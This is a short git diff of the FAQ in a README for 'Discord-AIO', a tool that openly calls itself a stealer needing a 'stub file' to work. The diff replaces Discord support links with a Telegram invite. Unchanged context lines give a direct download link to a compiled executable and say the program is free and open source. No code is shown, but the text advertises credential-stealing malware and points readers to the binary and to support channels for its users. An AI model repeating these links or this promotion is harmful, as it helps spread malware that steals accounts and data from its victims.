@@ -211,7 +211,7 @@ Old branch.
 Yes, the program is 100% free and open source.
 
 - Where can i get help?<br />
-On our [discord](https://discord.gg/C8zauKSBR2).
+On our [telegram](https://t.me/+fwzBhvxr1a0zOTU8).
 
 - How to use it?<br />
 You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.7.2/Discord.AIO.exe) or discord above.
@@ -220,7 +220,7 @@ You need to compile open source files or download released stable program from [
 Program contains the stub file which is necessary to make stealer work, it's all open source so if you are extremly scared check it by yourself.
 
 - Will it be supported in the future?<br />
-Yes, i'm planning the support for long period of time, mainly on Null Community [discord](https://discord.gg/qjrDprutvg).
+Yes, i'm planning the support for long period of time, mainly on our [telegram](https://t.me/+fwzBhvxr1a0zOTU8).
 
 <div align="center">
 
